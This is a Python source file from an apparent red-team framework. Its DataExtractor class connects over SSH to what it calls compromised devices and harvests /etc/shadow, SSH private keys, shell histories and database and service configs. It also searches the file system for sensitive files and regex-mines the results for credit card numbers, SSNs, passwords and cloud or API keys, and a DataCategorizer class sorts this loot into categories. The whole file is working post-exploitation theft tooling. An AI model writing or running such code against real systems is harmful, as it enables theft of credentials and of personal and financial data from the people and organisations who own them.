import logging
import paramiko
import os
import re
from typing import Dict, Any, List, Optional

from redteam_framework.core.logger import logger

class DataExtractor:
    """
    Handles extraction of sensitive data from compromised devices.
    """
    
    def __init__(self, access_info: Dict[str, Any]):
        """
        Initialize extractor with access information.
        Example access_info:
        {
            'service': 'ssh',
            'ip': '192.168.1.10',
            'port': 22,
            'username': 'root',
            'password': 'password'
        }
        """
        self.access_info = access_info
        self.ssh_client = None
        self.connected = False
        self.extracted_data = {
            'system_info': {},
            'credentials': [],
            'files': [],
            'network_info': {},
            'processes': [],
            'sensitive_data': {}
        }

    def connect(self) -> bool:
        """Establish connection to the target device."""
        if self.access_info['service'] == 'ssh':
            try:
                self.ssh_client = paramiko.SSHClient()
                self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                self.ssh_client.connect(
                    hostname=self.access_info['ip'],
                    port=self.access_info['port'],
                    username=self.access_info['username'],
                    password=self.access_info['password'],
                    timeout=10
                )
                self.connected = True
                logger.info(f"Successfully connected to {self.access_info['ip']} via SSH")
                return True
            except Exception as e:
                logger.error(f"SSH connection failed: {e}")
                return False
        return False

    def execute_command(self, command: str) -> tuple[Optional[str], Optional[str], int]:
        """
        Execute a command on the target device.
        Returns: (stdout, stderr, exit_status)
        """
        if not self.connected:
            logger.error("Not connected to target device")
            return None, None, -1

        try:
            stdin, stdout, stderr = self.ssh_client.exec_command(command)
            stdout_str = stdout.read().decode('utf-8', errors='ignore')
            stderr_str = stderr.read().decode('utf-8', errors='ignore')
            exit_status = stdout.channel.recv_exit_status()
            return stdout_str, stderr_str, exit_status
        except Exception as e:
            logger.error(f"Command execution failed: {e}")
            return None, None, -1

    def extract_system_info(self) -> Dict[str, Any]:
        """Extract basic system information."""
        if not self.connected:
            return {}

        system_info = {}

        # OS Info
        os_info, _, _ = self.execute_command('uname -a')
        if os_info:
            system_info['os_info'] = os_info.strip()

        # Kernel version
        kernel, _, _ = self.execute_command('cat /proc/version')
        if kernel:
            system_info['kernel_version'] = kernel.strip()

        # Distribution info
        distro, _, _ = self.execute_command('cat /etc/os-release')
        if distro:
            system_info['distribution'] = distro.strip()

        # Architecture
        arch, _, _ = self.execute_command('uname -m')
        if arch:
            system_info['architecture'] = arch.strip()

        # Uptime
        uptime, _, _ = self.execute_command('uptime')
        if uptime:
            system_info['uptime'] = uptime.strip()

        # Hostname
        hostname, _, _ = self.execute_command('hostname')
        if hostname:
            system_info['hostname'] = hostname.strip()

        self.extracted_data['system_info'] = system_info
        logger.info(f"System info extracted from {self.access_info['ip']}")
        return system_info

    def extract_credentials(self) -> List[Dict[str, Any]]:
        """Extract potential credentials from common locations."""
        if not self.connected:
            return []

        credentials = []
        # Common paths to check for credentials
        credential_paths = [
            '/etc/shadow',
            '/etc/passwd',
            '/root/.ssh/id_rsa',
            '/root/.ssh/id_dsa',
            '/home/*/.ssh/id_rsa',
            '/home/*/.ssh/id_dsa',
            '/etc/mysql/my.cnf',
            '/etc/postgresql/*/*/pg_hba.conf',
            '/etc/hosts',
            '/etc/fstab',
            '/etc/network/interfaces',
            '/etc/sudoers',
            '/etc/crontab',
            '/home/*/.bash_history',
            '/root/.bash_history',
            '/home/*/.zsh_history',
            '/root/.zsh_history',
            '/etc/environment',
            '/etc/profile',
            '/etc/bash.bashrc',
            '/etc/ssh/sshd_config',
            '/etc/ssh/ssh_config',
            '/etc/apache2/apache2.conf',
            '/etc/nginx/nginx.conf',
            '/etc/vsftpd.conf',
            '/etc/proftpd.conf'
        ]

        for path in credential_paths:
            try:
                # Use find to get actual paths for wildcards
                if '*' in path:
                    find_cmd = f"find {path.split('*')[0]} -name '{path.split('/')[-1]}' 2>/dev/null"
                    stdout, _, _ = self.execute_command(find_cmd)
                    if stdout:
                        actual_paths = stdout.strip().split('\n')
                        for actual_path in actual_paths:
                            if actual_path:
                                cred_data = self._read_file(actual_path)
                                if cred_data:
                                    credentials.append({
                                        'path': actual_path,
                                        'content': cred_data,
                                        'type': self._infer_credential_type(actual_path)
                                    })
                else:
                    cred_data = self._read_file(path)
                    if cred_data:
                        credentials.append({
                            'path': path,
                            'content': cred_data,
                            'type': self._infer_credential_type(path)
                        })
            except Exception as e:
                logger.debug(f"Error reading {path}: {e}")
                continue

        self.extracted_data['credentials'] = credentials
        logger.info(f"Found {len(credentials)} potential credential files from {self.access_info['ip']}")
        return credentials

    def _read_file(self, path: str) -> Optional[str]:
        """Read a file from the target device."""
        command = f"cat '{path}' 2>/dev/null"
        stdout, stderr, exit_status = self.execute_command(command)
        if exit_status == 0 and stdout:
            return stdout
        return None

    def _infer_credential_type(self, path: str) -> str:
        """Infer the type of credential based on file path."""
        if 'shadow' in path:
            return 'password_hash'
        elif 'ssh' in path and ('id_rsa' in path or 'id_dsa' in path):
            return 'ssh_private_key'
        elif 'mysql' in path or 'postgresql' in path:
            return 'database_credential'
        elif 'bash_history' in path or 'zsh_history' in path:
            return 'command_history'
        elif 'hosts' in path or 'fstab' in path:
            return 'network_config'
        else:
            return 'unknown_config'

    def extract_sensitive_files(self, search_paths: Optional[List[str]] = None) -> List[Dict[str, Any]]:
        """Extract files matching sensitive patterns."""
        if not self.connected:
            return []

        if search_paths is None:
            # Default sensitive search paths
            search_paths = [
                '/home/*',
                '/root',
                '/tmp',
                '/var/log',
                '/etc',
                '/opt',
                '/usr/local'
            ]

        sensitive_files = []
        # Patterns for sensitive files
        sensitive_patterns = [
            r'.*\.(pem|key|p12|pfx|cer|crt|pub)$',  # Certificates, keys
            r'.*\.sql$',  # SQL dumps
            r'.*\.bak$',  # Backup files
            r'.*\.old$',  # Old files
            r'.*\.log$',  # Log files
            r'config\..*',  # Config files
            r'.*\.env$',  # Environment files
            r'.*\.ini$',  # INI config
            r'.*\.xml$',  # XML config
            r'.*\.json$',  # JSON config
            r'password.*',
            r'credential.*',
            r'access.*',
            r'key.*',
            r'secret.*',
            r'auth.*'
        ]

        for base_path in search_paths:
            find_cmd = f"find {base_path} -type f -size -10M 2>/dev/null | head -50"  # Limit to 50 files
            stdout, _, _ = self.execute_command(find_cmd)
            if stdout:
                files = stdout.strip().split('\n')
                for file_path in files:
                    if file_path:
                        for pattern in sensitive_patterns:
                            if re.search(pattern, os.path.basename(file_path), re.IGNORECASE):
                                file_content = self._read_file(file_path)
                                if file_content:
                                    sensitive_files.append({
                                        'path': file_path,
                                        'content': file_content,
                                        'size': len(file_content),
                                        'pattern_matched': pattern
                                    })
                                break  # Break after first match to avoid duplicates

        self.extracted_data['files'] = sensitive_files
        logger.info(f"Found {len(sensitive_files)} sensitive files from {self.access_info['ip']}")
        return sensitive_files

    def extract_network_info(self) -> Dict[str, Any]:
        """Extract network configuration and connections."""
        if not self.connected:
            return {}

        network_info = {}

        # IP configuration
        ip_config, _, _ = self.execute_command('ip addr show')
        if ip_config:
            network_info['ip_config'] = ip_config.strip()

        # Routing table
        routing, _, _ = self.execute_command('ip route show')
        if routing:
            network_info['routing_table'] = routing.strip()

        # ARP table
        arp, _, _ = self.execute_command('arp -a')
        if arp:
            network_info['arp_table'] = arp.strip()

        # Active connections
        connections, _, _ = self.execute_command('ss -tuln')
        if connections:
            network_info['active_connections'] = connections.strip()

        # Firewall status (iptables)
        iptables, _, _ = self.execute_command('iptables -L -n -v 2>/dev/null')
        if iptables:
            network_info['iptables_rules'] = iptables.strip()

        # DNS configuration
        resolv_conf, _, _ = self.execute_command('cat /etc/resolv.conf')
        if resolv_conf:
            network_info['dns_config'] = resolv_conf.strip()

        self.extracted_data['network_info'] = network_info
        logger.info(f"Network info extracted from {self.access_info['ip']}")
        return network_info

    def extract_processes(self) -> List[Dict[str, Any]]:
        """Extract running processes."""
        if not self.connected:
            return []

        processes = []
        ps_output, _, _ = self.execute_command('ps aux --forest')
        if ps_output:
            lines = ps_output.strip().split('\n')[1:]  # Skip header
            for line in lines:
                parts = line.split(None, 10)  # Split into max 11 parts
                if len(parts) >= 11:
                    processes.append({
                        'user': parts[0],
                        'pid': parts[1],
                        'cpu': parts[2],
                        'mem': parts[3],
                        'vsz': parts[4],
                        'rss': parts[5],
                        'tty': parts[6],
                        'stat': parts[7],
                        'start': parts[8],
                        'time': parts[9],
                        'command': parts[10]
                    })

        self.extracted_data['processes'] = processes
        logger.info(f"Found {len(processes)} processes on {self.access_info['ip']}")
        return processes

    def extract_sensitive_data(self) -> Dict[str, Any]:
        """
        Run all extraction methods and return consolidated data.
        This is the main method to call for full extraction.
        """
        if not self.connect():
            logger.error(f"Cannot extract data from {self.access_info['ip']}, connection failed.")
            return {}

        logger.info(f"Starting data extraction from {self.access_info['ip']}")

        self.extract_system_info()
        self.extract_credentials()
        self.extract_sensitive_files()
        self.extract_network_info()
        self.extract_processes()

        # Consolidate sensitive data based on content analysis
        self._analyze_content_for_sensitive_data()

        logger.info(f"Data extraction completed for {self.access_info['ip']}")
        return self.extracted_data

    def _analyze_content_for_sensitive_data(self):
        """Analyze extracted content for specific sensitive data patterns."""
        sensitive_patterns = {
            'email': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
            'credit_card': r'\b(?:\d{4}[-\s]?){3}\d{4}\b|\b(?:\d{4}[-\s]?){2}\d{7}\b',
            'ssn': r'\b\d{3}-\d{2}-\d{4}\b',
            'phone': r'\b(?:\+?1[-.\s]?)?\(?([0-9]{3})\)?[-.\s]?([0-9]{3})[-.\s]?([0-9]{4})\b',
            'password': r'(?:password|pass|pwd|secret|token|key)[\s:=]+(\S{4,})',
            'api_key': r'(?:api[_-]?key|key|token)[\s:=]+(\S{20,})',
            'aws_key': r'AKIA[0-9A-Z]{16}',
            'private_key': r'-----BEGIN [A-Z ]*PRIVATE KEY-----.*?-----END [A-Z ]*PRIVATE KEY-----',
            'ssh_key': r'ssh-(?:rsa|dss|ed25519) [A-Za-z0-9+/]{20,}.*'
        }

        consolidated_sensitive = {
            'emails': [],
            'credit_cards': [],
            'ssns': [],
            'phones': [],
            'passwords': [],
            'api_keys': [],
            'aws_keys': [],
            'private_keys': [],
            'ssh_keys': []
        }

        # Analyze credentials content
        for cred in self.extracted_data['credentials']:
            content = cred.get('content', '')
            for data_type, pattern in sensitive_patterns.items():
                matches = re.findall(pattern, content, re.IGNORECASE | re.DOTALL)
                if matches:
                    consolidated_sensitive[f"{data_type}s"].extend(matches)

        # Analyze sensitive files content
        for file_entry in self.extracted_data['files']:
            content = file_entry.get('content', '')
            for data_type, pattern in sensitive_patterns.items():
                matches = re.findall(pattern, content, re.IGNORECASE | re.DOTALL)
                if matches:
                    consolidated_sensitive[f"{data_type}s"].extend(matches)

        self.extracted_data['sensitive_data'] = consolidated_sensitive
        logger.info(f"Sensitive data analysis completed for {self.access_info['ip']}")

    def close(self):
        """Close the connection."""
        if self.ssh_client:
            self.ssh_client.close()
            self.connected = False
            logger.info(f"Connection to {self.access_info['ip']} closed")

    def __enter__(self):
        """Context manager entry."""
        self.connect()
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        """Context manager exit."""
        self.close()


class DataCategorizer:
    """
    Handles categorization of extracted data.
    """
    
    def __init__(self):
        self.categories = {
            'credentials': [],
            'personal_info': [],
            'financial_data': [],
            'network_info': [],
            'system_info': [],
            'files': [],
            'api_keys': [],
            'ssh_keys': [],
            'other': []
        }

    def categorize_data(self, extracted_data: Dict[str, Any]) -> Dict[str, List[Any]]:
        """
        Categorize extracted data based on its content and source.
        """
        self.categories = {key: [] for key in self.categories}  # Reset categories

        # 1. Credentials
        if 'credentials' in extracted_data:
            for cred in extracted_data['credentials']:
                if 'password_hash' in cred.get('type', ''):
                    self.categories['credentials'].append({
                        'source': cred['path'],
                        'type': 'password_hash',
                        'content': cred['content']
                    })
                elif 'ssh_private_key' in cred.get('type', ''):
                    self.categories['ssh_keys'].append({
                        'source': cred['path'],
                        'content': cred['content']
                    })
                else:
                    self.categories['credentials'].append({
                        'source': cred['path'],
                        'type': cred['type'],
                        'content': cred['content']
                    })

        # 2. System info
        if 'system_info' in extracted_data:
            self.categories['system_info'].append(extracted_data['system_info'])

        # 3. Network info
        if 'network_info' in extracted_data:
            self.categories['network_info'].append(extracted_data['network_info'])

        # 4. Files
        if 'files' in extracted_data:
            for file_entry in extracted_data['files']:
                # Check for sensitive content inside files
                content = file_entry['content']
                if self._is_api_key(content):
                    self.categories['api_keys'].append({
                        'source': file_entry['path'],
                        'content': content
                    })
                elif self._is_ssh_key(content):
                    self.categories['ssh_keys'].append({
                        'source': file_entry['path'],
                        'content': content
                    })
                elif self._is_financial_data(content):
                    self.categories['financial_data'].append({
                        'source': file_entry['path'],
                        'content': content
                    })
                elif self._is_personal_info(content):
                    self.categories['personal_info'].append({
                        'source': file_entry['path'],
                        'content': content
                    })
                else:
                    self.categories['files'].append(file_entry)

        # 5. Sensitive data from analysis
        if 'sensitive_data' in extracted_data:
            sensitive = extracted_data['sensitive_data']
            if sensitive.get('credit_cards'):
                self.categories['financial_data'].extend([
                    {'type': 'credit_card', 'value': cc} for cc in sensitive['credit_cards']
                ])
            if sensitive.get('passwords'):
                self.categories['credentials'].extend([
                    {'type': 'plaintext_password', 'value': pwd} for pwd in sensitive['passwords']
                ])
            if sensitive.get('emails'):
                self.categories['personal_info'].extend([
                    {'type': 'email', 'value': email} for email in sensitive['emails']
                ])
            if sensitive.get('api_keys'):
                self.categories['api_keys'].extend([
                    {'type': 'api_key', 'value': key} for key in sensitive['api_keys']
                ])
            if sensitive.get('private_keys'):
                self.categories['ssh_keys'].extend([
                    {'type': 'private_key', 'value': key} for key in sensitive['private_keys']
                ])

        # 6. Other
        for key, value in extracted_data.items():
            if key not in ['credentials', 'files', 'system_info', 'network_info', 'processes', 'sensitive_data']:
                self.categories['other'].append({key: value})

        logger.info(f"Data categorized: {self._get_summary(self.categories)}")
        return self.categories

    def _is_api_key(self, content: str) -> bool:
        """Check if content contains API key patterns."""
        patterns = [
            r'api[_-]?key["\']?\s*[:=]\s*["\']?([A-Za-z0-9_\-]{20,})["\']?',
            r'token["\']?\s*[:=]\s*["\']?([A-Za-z0-9_\-]{20,})["\']?',
            r'["\']?([A-Za-z0-9]{32,})["\']?\s*[:=].*(secret|key|token)',
            r'AKIA[0-9A-Z]{16}',  # AWS
            r'AIza[0-9A-Za-z\-_]{35}',  # Google
            r'sk-[a-zA-Z0-9]{48}',  # OpenAI
            r'ghp_[a-zA-Z0-9]{36}',  # GitHub
        ]
        for pattern in patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        return False

    def _is_ssh_key(self, content: str) -> bool:
        """Check if content contains SSH private key."""
        return '-----BEGIN' in content and ('PRIVATE KEY' in content or 'DSA' in content or 'RSA' in content or 'Ed25519' in content)

    def _is_financial_data(self, content: str) -> bool:
        """Check if content contains financial data (credit cards, etc.)."""
        # Credit card pattern
        cc_pattern = r'\b(?:\d{4}[-\s]?){3}\d{4}\b|\b(?:\d{4}[-\s]?){2}\d{7}\b'
        # IBAN pattern
        iban_pattern = r'[A-Z]{2}[0-9]{2}[A-Z0-9]{4}[0-9]{7}([A-Z0-9]?){0,16}'
        return bool(re.search(cc_pattern, content)) or bool(re.search(iban_pattern, content))

    def _is_personal_info(self, content: str) -> bool:
        """Check if content contains personal info (emails, phones, etc.)."""
        email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
        phone_pattern = r'\b(?:\+?1[-.\s]?)?\(?([0-9]{3})\)?[-.\s]?([0-9]{3})[-.\s]?([0-9]{4})\b'
        ssn_pattern = r'\b\d{3}-\d{2}-\d{4}\b'
        return (bool(re.search(email_pattern, content, re.IGNORECASE)) or
                bool(re.search(phone_pattern, content)) or
                bool(re.search(ssn_pattern, content)))

    def _get_summary(self, categories: Dict[str, List[Any]]) -> str:
        """Get a summary of categorized data."""
        summary = []
        for cat, items in categories.items():
            if items:
                summary.append(f"{cat}: {len(items)} items")
        return ", ".join(summary)
